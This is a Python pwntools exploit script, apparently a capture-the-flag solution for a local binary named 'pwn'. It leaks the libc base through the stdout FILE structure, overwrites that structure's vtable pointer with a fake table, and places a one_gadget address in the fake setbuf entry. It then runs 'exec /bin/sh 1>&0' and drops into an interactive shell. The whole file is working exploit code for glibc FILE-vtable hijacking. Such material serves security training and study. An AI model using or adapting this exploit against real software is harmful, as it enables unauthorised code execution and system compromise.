#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = process('./pwn', env = {'LD_PRELOAD':'./libc.so.6'})
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

onegadget = 0x45216
onegadget = 0x4526a
onegadget = 0xf02a4
onegadget = 0xf1147

def change(loc, val):
    io.send(p64(loc))
    io.send(val)

if __name__ == '__main__':
    raw_input('onegadget no use')
    io.recvuntil('it ')
    libcbase = int(io.recv(14), 16) - libc.sym['_IO_2_1_stdout_']
    success('libc base -> {:#x}'.format(libcbase))
    libc.address = libcbase
    # success('shell -> {:#x}'.format(elf.sym['shell']))
    onegadget = libcbase + onegadget
    success('onegadget -> {:#x}'.format(onegadget))

    vtableptr = libcbase + 0x3c56f8
    success('vtable ptr -> {:#x}'.format(vtableptr))

    vtable = libcbase + 0x3c36e0
    fake_vtable = libcbase + 0x3c4008
    success('fake vtable -> {:#x}'.format(fake_vtable))
    fake_setbuf = fake_vtable + 0x58
    success('fake setbuf ->{:#x}'.format(fake_setbuf))
    success('exit -> {:#x}'.format(libc.sym['exit']))
    raw_input('debug >')
    for i in range(2) :
        change(vtableptr+i, p64(fake_vtable)[i])
    for i in range(3):
        change(fake_setbuf+i, p64(onegadget)[i])

    io.sendline('exec /bin/sh 1>&0')
    io.interactive()
    io.close()
